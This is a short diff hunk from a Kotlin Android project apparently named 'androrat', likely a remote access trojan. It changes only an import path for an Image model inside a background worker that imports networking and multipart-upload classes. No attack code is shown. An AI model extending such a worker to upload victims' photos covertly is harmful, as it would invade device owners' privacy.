@@ -7,7 +7,7 @@ import android.util.Log
 import androidx.work.CoroutineWorker
 import androidx.work.WorkerParameters
 import com.ierusalem.androrat.core.networking.RetrofitInstance
-import com.ierusalem.androrat.features.home.domain.Image
+import com.ierusalem.androrat.features.home.domain.model.Image
 import okhttp3.MultipartBody
 import okhttp3.RequestBody.Companion.asRequestBody
 import retrofit2.HttpException
